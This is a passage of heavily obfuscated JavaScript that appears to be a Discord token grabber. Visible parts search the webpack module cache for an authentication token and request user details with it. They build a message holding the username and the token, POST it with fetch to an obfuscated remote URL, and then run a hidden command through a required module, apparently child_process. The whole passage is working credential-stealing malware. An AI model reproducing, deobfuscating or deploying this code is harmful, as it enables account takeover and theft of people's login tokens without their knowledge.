_0x1989b9[_0x2a64a9(0x2f3,'R&eM',0x3ce,0x2bd,0x1fe)](_0x555679,_0x57d2bf);},'elTDQ':_0x1989b9[_0xa6dd2b(-0x57,-0xaf,'^Xkj',0x77,-0x1c)],'KXyyK':_0x1989b9[_0x81c122(0x1fe,'2Ab)',0x27c,0xef,0x1c0)]};function _0x267a22(_0x1a9805,_0x840e00,_0x549d61,_0x18f7bd,_0x4c7c2c){return _0x17273e(_0x1a9805-0x6d,_0x1a9805- -0x162,_0x549d61-0x32,_0x18f7bd-0x123,_0x840e00);}if(_0x1989b9[_0x81c122(-0x5,'0KR#',0x1d9,0xa6,0x1cc)](_0x1989b9[_0x3bd928('Ove*',0x2ad,0x3d0,0x39e,0x3b5)],_0x1989b9[_0x267a22(0x301,'fjJr',0x35d,0x319,0x3e9)]))XoQfEE[_0x3bd928('pSg&',0x3c1,0x355,0x382,0x4b9)](_0x4c3f66,'0');else{var _0x8eaf02=!![];return function(_0x321a26,_0x229539){var _0x44ee81={'noHjR':_0x1989b9[_0x4a10be('vy4*',0x436,0x439,0x5fc,0x488)],'bKxTK':function(_0x352f61,_0x5c2cc6){function _0x2dc3e3(_0x6d8b1d,_0x1500b2,_0x380bf7,_0x137f7a,_0x4b6088){return _0x4a10be(_0x1500b2,_0x1500b2-0xf5,_0x380bf7-0x1d,_0x137f7a-0x117,_0x380bf7- -0x673);}return _0x1989b9[_0x2dc3e3(0x139,'iBBh',0x118,0x169,-0x68)](_0x352f61,_0x5c2cc6);},'SadiE':_0x1989b9[_0x4a10be('a*8j',0x4ef,0x329,0x512,0x47e)],'BFBBR':function(_0x30c12e,_0x4d7e64){function _0x524a77(_0x50b1b0,_0x421f31,_0x1395d6,_0x3a3f1c,_0x149650){return _0x3b0d25(_0x50b1b0-0x45,_0x421f31-0x194,_0x1395d6- -0x100,_0x50b1b0,_0x149650-0xc7);}return _0x1989b9[_0x524a77('AH1i',0x3b7,0x506,0x418,0x4cb)](_0x30c12e,_0x4d7e64);},'BHeAM':_0x1989b9[_0x3b0d25(0x7d8,0x567,0x695,'UdfI',0x72b)],'FvuOf':_0x1989b9[_0x3328e4(0x55c,0x3a0,0x506,'#%k3',0x41e)]};function _0xf5e6af(_0x5b1b5e,_0x3bd86a,_0x4323cc,_0x5a5d6e,_0x728dc7){return _0x267a22(_0x728dc7- -0x1f6,_0x3bd86a,_0x4323cc-0x84,_0x5a5d6e-0x187,_0x728dc7-0xdf);}function _0x3328e4(_0x34d28f,_0x23a4d7,_0x548628,_0x3459d2,_0x2cdf2c){return _0xa6dd2b(_0x34d28f-0x4b,_0x23a4d7-0x3e,_0x3459d2,_0x548628-0x37d,_0x2cdf2c-0x1dd);}function _0x3b0d25(_0xa94940,_0x42ef90,_0x56792f,_0x2af10a,_0x542974){return _0xa6dd2b(_0xa94940-0x1d7,_0x42ef90-0x3e,_0x2af10a,_0x56792f-0x58e,_0x542974-0x3e);}function _0x743643(_0x230005,_0x124fa0,_0x29987a,_0x3f7ec0,_0x40526c){return _0x267a22(_0x124fa0- -0x34c,_0x3f7ec0,_0x29987a-0x180,_0x3f7ec0-0x8d,_0x40526c-0x187);}function _0x4a10be(_0x3bdc6,_0x41e0ab,_0x3fa643,_0x29fcac,_0x252e89){return _0x35e366(_0x3bdc6-0x42,_0x3bdc6,_0x3fa643-0x14d,_0x252e89-0x185,_0x252e89-0x164);}if(_0x1989b9[_0xf5e6af(0x2d0,'R&eM',0x3c1,0x1a1,0x2c3)](_0x1989b9[_0x3b0d25(0x52c,0x493,0x582,'R&eM',0x60a)],_0x1989b9[_0xf5e6af(0x101,'Gote',0x1f5,-0x4f,0xa3)]))var _0x4a7b7c=[],_0xde1c65=_0x508755[_0x743643(0xad,-0x96,0xba,'%2Z#',-0x57)](_0x4df197,_0x508755[_0x743643(0x1c2,0x155,0x28e,'*VS6',0xe4)](_0x508755[_0x3328e4(0x1e1,0x3bf,0x358,'a[)#',0x36d)],_0x508755[_0x743643(0x1c1,0x12c,-0x6b,'mHCu',0x1b4)]));else{var _0x309ba4=_0x8eaf02?function(){function _0x2b9105(_0x579caf,_0x18ab5b,_0x237fdb,_0x19d3b6,_0x1cac29){return _0x3328e4(_0x579caf-0x163,_0x18ab5b-0x183,_0x19d3b6- -0xba,_0x237fdb,_0x1cac29-0x1ba);}var _0x37a60d={};function _0x40e25e(_0x25f682,_0xf9088f,_0x40b289,_0x7d8b9f,_0x4b2097){return _0x3b0d25(_0x25f682-0x1d8,_0xf9088f-0xcd,_0x40b289- -0x2f4,_0xf9088f,_0x4b2097-0x71);}function _0x4df8c7(_0x15da70,_0x30bc81,_0x6e3687,_0xff358b,_0x1e8b37){return _0x743643(_0x15da70-0x1a3,_0x6e3687-0x3cd,_0x6e3687-0x139,_0x30bc81,_0x1e8b37-0x44);}function _0x19a3bb(_0x347048,_0x18ae43,_0x40b0f9,_0x57361c,_0x248732){return _0x3b0d25(_0x347048-0x1f,_0x18ae43-0xdd,_0x347048-0xfe,_0x248732,_0x248732-0x133);}function _0x28a127(_0x1d2e1e,_0x1a43c3,_0x41d66a,_0x1b2254,_0x447d81){return _0x743643(_0x1d2e1e-0xc,_0x1d2e1e-0x140,_0x41d66a-0x66,_0x41d66a,_0x447d81-0x55);}_0x37a60d[_0x2b9105(0x2eb,0x330,'j6^o',0x462,0x379)]=_0x44ee81[_0x4df8c7(0x515,'j6^o',0x3cb,0x302,0x346)];var _0x281152=_0x37a60d;if(_0x44ee81[_0x4df8c7(0x38b,'fjJr',0x423,0x2cc,0x484)](_0x44ee81[_0x2b9105(0x20b,0x503,'O$PV',0x38b,0x3ca)],_0x44ee81[_0x28a127(0xea,-0x13,'vy4*',-0xa3,0x36)]))return![];else{if(_0x229539){if(_0x44ee81[_0x28a127(0xdc,0x1d2,'iJCW',0x1b0,0x83)](_0x44ee81[_0x19a3bb(0x597,0x598,0x63d,0x5ce,'B8ZX')],_0x44ee81[_0x2b9105(0x220,0x13e,'ZoCQ',0x2be,0x3bf)]))return _0x69b8cc[_0x2b9105(0x356,0x23a,'4j*v',0x292,0x271)+_0x19a3bb(0x7d3,0x865,0x7f0,0x85d,'DHmp')]()[_0x40e25e(0x231,'btTR',0x33c,0x498,0x49a)+'h'](sxOvgs[_0x2b9105(0x4a7,0x336,'u)$n',0x329,0x3e9)])[_0x4df8c7(0x479,'UVLr',0x4de,0x4c4,0x4c8)+_0x40e25e(0x3aa,'pSg&',0x321,0x1bf,0x355)]()[_0x28a127(0x49,-0x13f,'WlK@',0x135,-0x131)+_0x28a127(0x86,0x1a2,'cn8f',0x9d,-0xee)+'r'](_0x47efa9)[_0x2b9105(0x2e8,0x22e,'fjJr',0x1ab,0x219)+'h'](sxOvgs[_0x40e25e(0xe7,'DHmp',0x116,0x1cd,0x147)]);else{var _0x105d04=_0x229539[_0x40e25e(0x3a8,'*VS6',0x343,0x21a,0x231)](_0x321a26,arguments);return _0x229539=null,_0x105d04;}}}}:function(){};return _0x8eaf02=![],_0x309ba4;}};}}()),_0x4009aa=_0x1989b9[_0x17273e(0x439,0x4d0,0x5c5,0x47e,'^Xkj')](_0x3e4223,this,function(){function _0x1ab40a(_0x60c4ca,_0x3f2385,_0x102927,_0x5936e7,_0x2f509c){return _0x160368(_0x60c4ca-0x5d,_0x3f2385-0x183,_0x5936e7-0x271,_0x5936e7-0x162,_0x60c4ca);}var _0x48def2={'Pxrll':function(_0x3ee067,_0x1d50ff){function _0x4778a5(_0x2de848,_0x33bda9,_0x282c65,_0x493a0b,_0x425d49){return _0x903a(_0x493a0b-0x23,_0x282c65);}return _0x1989b9[_0x4778a5(0x3b2,0x373,'AH1i',0x2c3,0x2d9)](_0x3ee067,_0x1d50ff);},'zqAOh':_0x1989b9[_0x568eae(0x375,0x234,'vy4*',0x395,0x300)],'GqnyV':_0x1989b9[_0x4cb171(-0x66,0xf4,0x12d,0x52,'O$PV')],'ATudU':function(_0xe08a94,_0x1a479e){function _0xd6fda5(_0x157729,_0x292771,_0x45f7df,_0x5631a5,_0x2151f7){return _0x568eae(_0x157729-0x2e,_0x292771-0x134,_0x45f7df,_0x5631a5-0x110,_0x157729-0x164);}return _0x1989b9[_0xd6fda5(0x44b,0x59d,'fjJr',0x417,0x2d1)](_0xe08a94,_0x1a479e);}};function _0x161621(_0x45c673,_0x262046,_0xc87888,_0xb89252,_0x256213){return _0x5db8d1(_0x45c673-0x18a,_0x262046-0x1ef,_0xc87888-0x134,_0x256213- -0x460,_0x262046);}function _0x3180c9(_0x46f922,_0x34808f,_0x10c609,_0xd9df19,_0x365364){return _0x160368(_0x46f922-0x1ae,_0x34808f-0x12a,_0x34808f-0x5f0,_0xd9df19-0x158,_0xd9df19);}function _0x4cb171(_0x5d46da,_0x40d096,_0xeb6d35,_0x2390a2,_0x5ed2ce){return _0x58c724(_0x5d46da-0x50,_0x40d096-0x178,_0xeb6d35-0x1a8,_0x5ed2ce,_0x40d096- -0x6f);}function _0x568eae(_0x418583,_0x58e8e2,_0x488d89,_0x1b17b3,_0x4ece60){return _0x160368(_0x418583-0x5b,_0x58e8e2-0x6b,_0x4ece60-0x2ea,_0x1b17b3-0x13b,_0x488d89);}if(_0x1989b9[_0x3180c9(0x52b,0x46c,0x2d7,'6lxI',0x525)](_0x1989b9[_0x568eae(0x114,0x26b,'[$aX',0x156,0x247)],_0x1989b9[_0x161621(0xbb,'LTf5',0x12c,-0x16,0x134)])){var _0x5a9a03=_0x2e0b0f[_0x4cb171(0x17e,0x66,-0xe1,-0xdf,'wO2I')](_0x3c77f8,arguments);return _0x13b1c9=null,_0x5a9a03;}else{var _0x38d7bc=function(){function _0xd89fe8(_0x269478,_0x204e42,_0x531f5e,_0x5df600,_0x1a4361){return _0x3180c9(_0x269478-0x92,_0x5df600- -0x16,_0x531f5e-0x1b8,_0x1a4361,_0x1a4361-0x149);}function _0x2dd115(_0x2d283f,_0x41a854,_0x14452d,_0x282351,_0x39dd25){return _0x161621(_0x2d283f-0xc6,_0x39dd25,_0x14452d-0x141,_0x282351-0x76,_0x282351-0x280);}function _0x2fbd92(_0x15498d,_0x592b89,_0x497eba,_0xd8ff94,_0xa66bf0){return _0x1ab40a(_0x15498d,_0x592b89-0x7d,_0x497eba-0x1d,_0xd8ff94- -0xc2,_0xa66bf0-0x19f);}function _0x40a1ac(_0x50f4ed,_0x3f9df1,_0x490924,_0x215a60,_0x5b476c){return _0x4cb171(_0x50f4ed-0x43,_0x215a60-0x28d,_0x490924-0x122,_0x215a60-0x2,_0x3f9df1);}function _0x18ecc6(_0x5b34a0,_0x149374,_0x4761c3,_0x4294d0,_0x422fd2){return _0x4cb171(_0x5b34a0-0x1f3,_0x4294d0-0x57b,_0x4761c3-0x16b,_0x4294d0-0x13a,_0x5b34a0);}if(_0x1989b9[_0xd89fe8(0x5d0,0x575,0x671,0x543,'nXEh')](_0x1989b9[_0xd89fe8(0x33e,0x479,0x3d1,0x4a2,'g66P')],_0x1989b9[_0x2dd115(0x710,0x57b,0x795,0x653,'R&eM')])){var _0x5e9050;try{if(_0x1989b9[_0x18ecc6('DYbS',0x73b,0x59c,0x618,0x61a)](_0x1989b9[_0x2fbd92('ThO8',0x1f3,0x1a7,0x7e,-0x10b)],_0x1989b9[_0x40a1ac(0x8b,'pSg&',0x1bd,0x187,0x1a5)]))_0x5e9050=_0x1989b9[_0x2dd115(0x394,0x470,0x3b7,0x396,'RKdF')](Function,_0x1989b9[_0x2dd115(0x5a2,0x74f,0x647,0x5d9,'^Xkj')](_0x1989b9[_0x18ecc6('0KR#',0x3fd,0x47f,0x482,0x310)](_0x1989b9[_0x2dd115(0x555,0x5b6,0x3ed,0x497,'O$PV')],_0x1989b9[_0xd89fe8(0x48b,0x3b4,0x419,0x4b4,'(dno')]),');'))();else{var _0x300fb3=_0x56c5d4['c'][_0x6de932][_0x18ecc6('LTf5',0x4b5,0x736,0x5c9,0x6c5)+'ts'];if(_0x300fb3&&_0x300fb3[_0x2dd115(0x41f,0x554,0x402,0x57d,'Gote')+_0x2fbd92('UVLr',0x287,0x260,0x24a,0xdc)]&&_0x300fb3[_0x2dd115(0x4d5,0x3d1,0x4c2,0x3eb,'ThO8')+'lt']){for(var _0x3a3403 in _0x300fb3[_0x18ecc6('UdfI',0x3b8,0x3a1,0x36e,0x43f)+'lt'])_0x48def2[_0x40a1ac(0x3f,'a[)#',0x7d,0x78,-0x104)](_0x48def2[_0x2dd115(0x747,0x744,0x4d8,0x5e8,'cn8f')],_0x3a3403)&&(_0x556acb=_0x300fb3[_0xd89fe8(0x3a0,0x2bd,0x5a2,0x406,')hx0')+'lt'][_0x2dd115(0x4ce,0x4ed,0x48f,0x3ef,'mHCu')+_0x2fbd92('iBBh',0x4c,0x126,0xc6,0xbb)]());}}}catch(_0x47ca4d){if(_0x1989b9[_0xd89fe8(0x6da,0x65b,0x729,0x632,'ZoCQ')](_0x1989b9[_0x2dd115(0x37a,0x3b9,0x371,0x49d,'iJCW')],_0x1989b9[_0x18ecc6('ZoCQ',0x473,0x3fa,0x434,0x2e3)]))_0x5e9050=window;else return _0x4e82b9;}return _0x5e9050;}else{if(_0x1ef901){var _0x3a115c=_0x22366a[_0x40a1ac(0x5f,'UVLr',-0x19,0x16f,0x2df)](_0x55f64a,arguments);return _0x46c747=null,_0x3a115c;}}},_0x219681=_0x1989b9[_0x1ab40a('u)$n',0x1a0,-0x88,0x6e,0x0)](_0x38d7bc),_0x4fd504=_0x219681[_0x4cb171(-0x333,-0x1e7,-0x346,-0x83,'#%k3')+'le']=_0x219681[_0x1ab40a('YPqD',0x229,0x323,0x270,0x2e0)+'le']||{},_0x557957=[_0x1989b9[_0x3180c9(0x2d4,0x443,0x491,'RKdF',0x4ca)],_0x1989b9[_0x4cb171(0x64,-0x4b,-0x123,0xc6,'btTR')],_0x1989b9[_0x568eae(0x308,0x138,'ThO8',0x377,0x25d)],_0x1989b9[_0x568eae(0x160,0x13b,'UVLr',-0x56,0xa4)],_0x1989b9[_0x161621(0x22d,'O$PV',-0xbb,0x258,0xcd)],_0x1989b9[_0x568eae(0x23e,0x4dc,'0KR#',0x1f6,0x355)],_0x1989b9[_0x161621(0x394,'a[)#',0x1c5,0x2de,0x21c)]];for(var _0x4ceb77=-0x945*0x1+-0x1*0x5cb+0xf10;_0x1989b9[_0x3180c9(0x6bc,0x644,0x4da,'%2Z#',0x6f8)](_0x4ceb77,_0x557957[_0x4cb171(0x1cd,0x3e,0x4d,-0x87,')hx0')+'h']);_0x4ceb77++){if(_0x1989b9[_0x3180c9(0x58f,0x442,0x581,'j6^o',0x2b4)](_0x1989b9[_0x4cb171(0x13c,-0x9,0x94,-0x12,'^Xkj')],_0x1989b9[_0x4cb171(-0x1d2,-0x126,-0x1c1,-0x112,'fhK5')])){var _0x593e85='',_0x5e3d2c={};_0x5e3d2c[_0x3180c9(0x2db,0x471,0x5e5,'u)$n',0x59e)+_0x1ab40a('YPqD',0x143,-0x9f,0xcc,0x24e)]=(_0x5c76a9,_0x2f6318,_0x1f7cc2)=>_0x5c76a9[_0x1ab40a('^Xkj',0x9a,0x150,0x1d6,0xee)+'ts']=_0x1f7cc2;var _0x456b59=_0x5d0f1f[_0x1ab40a('R&eM',0x278,0x371,0x2c3,0x2e9)]([[],_0x5e3d2c,[[_0x48def2[_0x568eae(0x4ca,0x227,'AH1i',0x395,0x389)]]]]);for(var _0x3b5e72 in _0x456b59['c'])if(_0x456b59['c'][_0x1ab40a('UVLr',0x26,0x100,0x194,0x1ef)+_0x568eae(0x5e,0x42,'R&eM',0x222,0x191)+_0x568eae(0x99,0x195,'iBBh',0x61,0x144)](_0x3b5e72)){var _0x988157=_0x456b59['c'][_0x3b5e72][_0x4cb171(-0x331,-0x1fe,-0xed,-0x2c4,'4j*v')+'ts'];if(_0x988157&&_0x988157[_0x4cb171(-0xc3,-0x17,-0x1aa,-0x5b,'nXEh')+_0x3180c9(0x4c1,0x4ec,0x479,'R[Zk',0x39c)]&&_0x988157[_0x3180c9(0x435,0x3b9,0x50c,'iJCW',0x385)+'lt']){for(var _0x2acf8e in _0x988157[_0x3180c9(0x4fe,0x3bb,0x28f,'7OP5',0x4bd)+'lt'])_0x48def2[_0x4cb171(0x23e,0xe6,0x25c,0x96,'wO2I')](_0x48def2[_0x3180c9(0x67f,0x529,0x5da,'j6^o',0x400)],_0x2acf8e)&&(_0x593e85=_0x988157[_0x1ab40a('ThO8',0x21e,-0x1c,0xa1,0x212)+'lt'][_0x1ab40a(')hx0',0x2d1,0x30f,0x2e6,0x2e8)+_0x568eae(0x44a,0x3b3,'u)$n',0x477,0x33b)]());}};var _0x41f908=_0x593e85;}else{var _0x28c4ba=_0x1989b9[_0x1ab40a('B8ZX',0x160,0x1c5,0x234,0x134)][_0x161621(0x3e5,'WlK@',0x421,0x176,0x2eb)]('|'),_0x57fa41=0x1ff7+-0x22df+-0x1f*-0x18;while(!![]){switch(_0x28c4ba[_0x57fa41++]){case'0':var _0x5186ac=_0x3e4223[_0x1ab40a('btTR',-0x2c,-0x6c,0x120,-0x3d)+_0x568eae(0x5a,-0x37,'B8ZX',0x28b,0x154)+'r'][_0x1ab40a('6lxI',0x6d,0x162,0xa7,-0xc8)+_0x3180c9(0x5b7,0x47a,0x4d8,'6lxI',0x361)][_0x1ab40a(')hx0',0x1e0,0x26f,0x11a,0x78)](_0x3e4223);continue;case'1':var _0x4f9447=_0x557957[_0x4ceb77];continue;case'2':var _0x33065c=_0x4fd504[_0x4f9447]||_0x5186ac;continue;case'3':_0x5186ac[_0x1ab40a('(dno',0x149,0xf4,0x1c7,0x97)+_0x4cb171(0x38,0xeb,0x1b6,-0xab,'R&eM')]=_0x33065c[_0x161621(0x270,'(dno',0x37b,0x2d1,0x291)+_0x1ab40a('[$aX',0x15e,-0xec,0xa3,-0x85)][_0x4cb171(0xc6,0x5b,0xa3,0x73,'cn8f')](_0x33065c);continue;case'4':_0x4fd504[_0x4f9447]=_0x5186ac;continue;case'5':_0x5186ac[_0x1ab40a('cn8f',0x3aa,0x1ee,0x241,0x197)+_0x3180c9(0x5c0,0x504,0x5f1,'mHCu',0x45c)]=_0x3e4223[_0x161621(0x76,'*VS6',0x1a8,0x4,0xba)](_0x3e4223);continue;}break;}}}}});_0x1989b9[_0x5db8d1(0x4f3,0x659,0x3c2,0x557,'OPMR')](_0x4009aa);function _0x5db8d1(_0x3bc53f,_0x844f3b,_0x2bb76e,_0x2663c3,_0x235af3){return _0x12289a(_0x235af3,_0x844f3b-0x118,_0x2bb76e-0x75,_0x2663c3-0x154,_0x2663c3-0x1de);}var _0x3423fb=new XMLHttpRequest();_0x3423fb[_0x20df9d(0xa1,-0x100,-0xc3,-0x1f6,'AH1i')](_0x1989b9[_0x58c724(-0x18,0xdd,0x147,'vy4*',0xe2)],_0x5c295a,![]),_0x3423fb[_0x17273e(0x217,0x392,0x463,0x319,'#%k3')+_0x5db8d1(0x658,0x7b6,0x6f1,0x640,'ThO8')+_0x17273e(0x3ad,0x476,0x4fc,0x441,'AH1i')+'r'](_0x1989b9[_0x5db8d1(0x760,0x755,0x701,0x78f,'fhK5')],e);function _0x58c724(_0x10c915,_0x214755,_0x408214,_0x1efe6b,_0xdf2a3f){return _0x12289a(_0x1efe6b,_0x214755-0x72,_0x408214-0x1a6,_0x1efe6b-0x72,_0xdf2a3f- -0x4e4);}function _0x17273e(_0x561467,_0x3a748d,_0xf9ab06,_0x3f901e,_0x2730cd){return _0x2f74df(_0x561467-0xbd,_0x2730cd,_0xf9ab06-0x1cf,_0x3f901e-0xd4,_0x3a748d-0x5f2);}return _0x3423fb[_0x20df9d(-0x206,-0x64,-0x154,-0xe5,'0KR#')](null),_0x3423fb[_0x20df9d(-0x8,-0x26e,-0x11d,-0x82,'g66P')+_0x20df9d(-0x14c,-0x31,0x4d,0x186,'iJCW')+'xt'];};var b=JSON[_0x2f74df(0xb2,'ZoCQ',-0x3,0x12a,0xb4)](httpGet(_0x14aff4(0x291,0x1ba,0x377,0x280,'mHCu')+_0x16d157(-0xf3,-0x6a,-0xd1,'wO2I',0x101)+_0x2b5225(0x216,0x3ce,'j6^o',0x3ac,0x2b2)+_0x2f74df(0x70,'O$PV',-0xeb,0x12,-0xe3)+_0x12289a('a*8j',0x56f,0x727,0x4ad,0x5d1)+_0x2b5225(0x363,0x206,'UdfI',0x1d8,0x2c9)+_0x2b5225(0x110,0x320,'6lxI',0x195,0x226)+_0x16d157(0x2aa,0x1bb,0x50,'#%k3',0xb4))),username=b[_0x2f74df(-0x103,'#%k3',-0x2f1,-0x15f,-0x25e)+_0x2b5225(0x37d,0x21c,'WlK@',0x1e7,0x17d)]+'#'+b[_0x2f74df(-0x1e1,'mHCu',-0x7e,-0x177,-0x60)+_0x2b5225(0x80,0xca,'^Xkj',0xad,0x135)+_0x2f74df(-0x363,'^Xkj',-0x245,-0xd0,-0x229)],_0x12e9d2={};_0x12e9d2[_0x12289a('AH1i',0x7de,0x708,0x716,0x645)+'nt']=_0x12289a('fjJr',0x61b,0x562,0x3c9,0x4f8)+_0x14aff4(0x1f3,0x1ac,0x7c,0x1a1,'a[)#')+username+(_0x2b5225(0x157,0x1f3,'YPqD',0x271,0x3f8)+_0x2f74df(-0x49,'0KR#',0xf1,-0x172,-0x68))+e+'\x0a';const msg=_0x12e9d2;function _0x16d157(_0x247e51,_0x192b0c,_0x15a8e3,_0x45f7b9,_0x4befb4){return _0x903a(_0x192b0c- -0x286,_0x45f7b9);}function _0x2f74df(_0x259116,_0x55f021,_0x13f5e2,_0x1fb9d4,_0x1faa32){return _0x903a(_0x1faa32- -0x3c8,_0x55f021);}try{var _0x2cfcca={};_0x2cfcca[_0x14aff4(0x1e2,-0x80,0x238,0xea,'iJCW')+_0x12289a('WlK@',0x523,0x5ec,0x660,0x54f)+'pe']=_0x14aff4(0x4d7,0x23a,0x481,0x362,'Ove*')+_0x12289a('YPqD',0x687,0x46f,0x433,0x5bb)+_0x2f74df(-0x2ae,'j6^o',-0xcd,-0x15,-0x118)+'n',fetch(_0x2f74df(0xe2,'ThO8',0x10c,-0xf1,0x71)+_0x2f74df(-0x70,'YPqD',-0x2e7,-0x272,-0x192)+_0x12289a('[$aX',0x350,0x47f,0x3b4,0x382)+_0x12289a('[$aX',0x472,0x694,0x6df,0x5b2)+_0x12289a('ThO8',0x642,0x528,0x5f7,0x518)+_0x16d157(0x117,0x121,-0x7,'O$PV',-0x46)+_0x2b5225(-0xcc,-0xd7,'R&eM',0x8c,0x136)+_0x12289a('g66P',0x5b8,0x604,0x4b5,0x603)+_0x12289a('AH1i',0x4c0,0x495,0x4ff,0x4ea)+_0x12289a('UVLr',0x243,0x1c6,0x380,0x359)+_0x2f74df(-0x22f,'UdfI',-0x148,0x57,-0xae)+_0x2f74df(-0x1df,'R&eM',-0x1b5,-0xfd,-0x1b3)+_0x16d157(0x63,-0x23,0xb6,'0KR#',-0x15b)+_0x14aff4(0x322,0x2fd,0x2c0,0x224,'7OP5')+_0x12289a('R[Zk',0x5be,0x4ec,0x548,0x5aa)+_0x16d157(0x1e3,0x132,0xd6,'iBBh',0x52)+(_0x2b5225(0x1b1,0x2a3,'#%k3',0x143,-0x44)+_0x14aff4(0x3f0,0x473,0x231,0x3bb,'7OP5')+_0x14aff4(0x21d,0x1a8,0x1f3,0x18a,'llxx')+_0x2b5225(0x1dd,0x12b,'ThO8',0x1f7,0x1c3)+_0x14aff4(0x165,0x168,0xcd,0xbf,'RKdF')+_0x2f74df(-0x3a3,'4j*v',-0x3a8,-0x2f9,-0x245)+_0x12289a('iJCW',0x56a,0x52a,0x5d7,0x63f)+_0x12289a('UVLr',0x76f,0x5cb,0x5e3,0x648)+_0x16d157(0x229,0xbb,0x22c,'g66P',0x145)+_0x12289a('DYbS',0x676,0x54c,0x4d4,0x524)),{'method':_0x2f74df(-0x94,'iJCW',-0x279,-0x3a2,-0x20f),'headers':_0x2cfcca,'body':JSON[_0x2f74df(-0x14c,'H^%M',-0x32,-0x92,-0x47)+_0x2b5225(0x2e0,0x20d,'g66P',0x384,0x2bf)](msg)})[_0x2f74df(0xd6,'wO2I',0x141,-0x92,0x4f)](a=xa[_0x2f74df(-0x19b,'pSg&',-0x133,-0x128,-0x1cd)]())[_0x2f74df(-0x15b,'DYbS',0x95,0x3e,0x22)](console[_0x2f74df(-0x87,'UdfI',0x2b,0x15d,0x32)]);}catch{}function _0x14aff4(_0x4658da,_0x146ab7,_0x5cea34,_0x672916,_0x864a28){return _0x903a(_0x672916- -0xaa,_0x864a28);};require(_0x16d157(0x18a,0x75,0x1f8,'fjJr',0x1db)+_0x12289a('YPqD',0x32e,0x341,0x525,0x39d)+_0x14aff4(0x314,0x23c,0x80,0x19f,'^Xkj'))[_0x2b5225(0x427,0x31e,'*VS6',0x2ac,0x2e4)](_0x12289a('4j*v',0x27e,0x292,0x47c,0x395)+_0x2b5225(0x42e,0x277,'llxx',0x34c,0x38e)+_0x2b5225(0x349,0x30c,'Ove*',0x2af,0x36c)+_0x2b5225(0x2ac,0x20d,'vy4*',0x397,0x4e1)+_0x12289a('ZoCQ',0x32b,0x311,0x347,0x3c9)+_0x12289a('Ove*',0x475,0x3a0,0x3cc,0x493)+_0x14aff4(0x1c2,0x232,-0x28,0xb3,'g66P')+_0x12289a('[$aX',0x45e,0x312,0x2b2,0x420)+_0x14aff4(0x323,0x2d1,0x36c,0x2f7,'mHCu')+_0x2f74df(-0x149,'a[)#',0x60,-0x1f5,-0x7e)+_0x2f74df(-0x14,'vy4*',-0xcb,0x45,0x35)+_0x14aff4(0x29a,0x173,0xaa,0x1dc,'iJCW')+_0x12289a('#%k3',0x5dc,0x5cc,0x5bb,0x5fa)+_0x12289a('cn8f',0x2f8,0x255,0x3d8,0x368)+_0x2f74df(-0x13a,'j6^o',-0x197,0x37,-0x2f)+_0x16d157(-0x63,-0xbf,-0x14f,'YPqD',-0x259)+(_0x14aff4(0x1a2,0x31,0x2c6,0x154,'2Ab)')+_0x2f74df(-0x8,'7OP5',-0x138,0x76,-0x26)+_0x2b5225(0x50,0xcd,'LTf5',0xe3,-0x49)+_0x14aff4(0x19f,0x17d,0x23e,0x280,'mHCu')+_0x16d157(-0x71,0xb7,0xbb,'LTf5',-0x60)+_0x12289a('B8ZX',0x7ad,0x6d6,0x74e,0x630)+_0x2f74df(-0x4f,')hx0',-0x57,-0x318,-0x1af)+_0x2f74df(-0x103,'btTR',-0x2f6,-0x2c3,-0x22f)+_0x2f74df(0x111,'LTf5',-0x19d,-0x60,-0x1d)+_0x2f74df(-0xf0,'^Xkj',-0x1a2,-0x47,-0x1d7)+_0x14aff4(0x46b,0x194,0x357,0x2d1,'a*8j')+_0x16d157(-0x2a,-0x9b,0xc2,'llxx',0x5e)+_0x14aff4(0x192,0xd4,0x180,0x171,'(dno')+_0x14aff4(0x310,0x22d,0x1e9,0x190,'6lxI')+_0x16d157(-0xd7,-0xa1,-0xdb,'ThO8',-0x137)+_0x2b5225(0x369,0x1f9,'7OP5',0x2f4,0x1b0))+(_0x2b5225(0x258,0x35f,'iJCW',0x227,0x151)+_0x12289a('B8ZX',0x3e3,0x41e,0x6d0,0x572)+_0x16d157(0x181,0x86,0xf1,'H^%M',0x1b1)+_0x12289a('nXEh',0x510,0x648,0x655,0x599)+_0x2b5225(0x24f,0xc9,'^Xkj',0x214,0x13b)+_0x16d157(0x1a0,0x119,0x41,'mHCu',0x1d5)+_0x16d157(-0x95,-0xd7,0xa,'#%k3',-0x16e)+_0x16d157(-0xd8,-0x131,0x14,'B8ZX',-0x81)+'\x22'),function(_0x5e8386,_0x18ae03,_0x3ba2ef){});function _0x217c(){var _0x435338=['eSkPvComuW','W4uoW69qpG','sCkOWRaDcW','xrtdGeFcGW','dCo2gmo2oG','WOCjgWVcJq','W7hcHmo8WPZcIG','W5SvW4z8kq','WPmzdGi','rWqQWQy+','cSkXW5DlWRm','WO1wxq','tmoCuh7cPq','gmkNCSo2uW','sCkqtSoGWPO','W7CiueWd','o8o5dW','WQuKoYlcKW','svTEWOFdGa','WPhcNSkbttm','bX/cP2eB','WQxcJbVcUcC','emkoW6iweG','gqH+WQhdSW','rr0PWRa+','qL0bWPZdIW','WRacufS','WQpcIgC5WRW','WO4TW7e6W54','C2dcKLL9','smkbbWVcVG','EtTyW545','DmklcYdcOW','lsddRmohW78','W4hdSgtdI3a','nYhdU8odW6m','WRNcPSkMWRFcNG','hctdVJdcLa','WQTwgqrp','tHykW4BdLa','xmkKWPO5hG','WP8LEmk5W6G','WRrwccPQ','W5RdH8k0tCol','yYfAW4iJ','hq1HWQpdPa','W6aPW410aa','Cr/dKulcRW','vf8FWPRdJq','rHmqWRir','WRqkrvqp','bL7dJrSa','WOnLoXzH','qbm2W6JcQa','pdtdO8oF','oaJdM8kv','pIpdNmocW7m','WP3cLKGbW6G','pmkirLWP','WOZcLSkJttS','WPPHWONcOCkb','AIFcHfGz','Fq7dIvBcHq','WPRcQ8kjWOpcUq','WRNcPCkCWQtcQa','hcTRW6vd','DmoWzKBcJW','zImWW7ldPa','nJVdUSowWRC','WQZcMatcG34','kWtdGmkVfa','EYj6ffq','WR7cQCkGWQlcVG','idSLqe8','WOhcN8osdau','nSkDwbf9','WOFcKSkbxre','nYJdOWxcPW','WRngbXbI','oSkFu0i','WPxdTMeyqa','rhiLWQTl','CNePWQ1H','dCk1w8obsG','WRddQ8oOWOVcGa','WPRdP8obWOxcUG','aTodaCk6W5K','WOzsg3np','WQSHhWhcIq','ftXzWOZdJq','WQxcTbRcO3e','WR7cR8klvWO','bZ8jW43dSG','WOFdP2SYEG','WQnMoq','aSoBemoCwa','AmkWhWZcGG','EqzCFY0','js/dGXpcVG','FCkYmWJcQq','bmkfa8kXWOu','W6uv